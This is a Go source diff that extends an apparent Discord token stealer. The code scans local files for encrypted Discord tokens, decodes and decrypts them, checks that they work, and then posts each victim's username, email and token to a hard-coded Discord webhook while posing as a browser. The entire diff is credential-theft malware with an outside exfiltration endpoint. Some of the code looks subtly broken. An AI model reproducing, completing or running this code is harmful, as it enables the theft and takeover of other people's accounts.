@@ -1,9 +1,13 @@
 package main
 
 import (
+	"bytes"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io/fs"
 	"io/ioutil"
+	"net/http"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -14,6 +18,10 @@ import (
 
 var tokens []string
 
+const (
+	WehookUrl = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
+)
+
 func main() {
 	start()
 	send_info()
@@ -23,6 +31,23 @@ func main() {
 }
 
 func send_info() {
+	for _, token := range tokens {
+		json, err := get_token_info(token)
+		if err {
+			fmt.Print(err)
+			continue
+		}
+		text := "Username: " + getJsonValue("username", json) + "#" + getJsonValue("discriminator", json) + "\n" + "Email: " + getJsonValue("email", json) + "\n" + "Token: " + token
+		jsonData := []byte(`{"content": ` + text + `}`)
+		req, _ := http.NewRequest("POST", "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS", bytes.NewBuffer(jsonData))
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
+		req.Header.Set("Content-Type", "application/json; charset=UTF-8")
+		cl := &http.Client{}
+		res, _ := cl.Do(req)
+		defer req.Body.Close()
+
+		fmt.Println(res)
+	}
 
 }
 
@@ -69,15 +94,24 @@ func start() {
 				file, _ := os.Open(filepath)
 				data, _ := ioutil.ReadAll(file)
 				for _, match := range r.FindAllString(string(data), -1) {
-					if !slices.Contains(tokens, string(match)) {
-						tokens = append(tokens, string(match))
+					baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
+					tokenEnc, _ := base64.StdEncoding.DecodeString(baseToken)
+					token, _ := decryptToken(tokenEnc)
+					_, val := get_token_info(token)
+					if !val {
+						continue
+					}
+
+					if !slices.Contains(tokens, string(token)) {
+						tokens = append(tokens, string(token))
+
 					}
 				}
 			}
 		}
 
 	}
-	fmt.Println(tokens[1])
+	fmt.Println(tokens)
 
 }
 
@@ -93,4 +127,16 @@ func get_files(root, ext string) []string {
 		return nil
 	})
 	return a
+}
+func getJsonValue(key string, jsonData string) (value string) {
+
+	var result map[string]interface{}
+
+	err := json.Unmarshal([]byte(jsonData), &result)
+	if err != nil {
+		return "Unknown"
+	}
+
+	value = fmt.Sprintf("%v", result[key])
+	return
 }
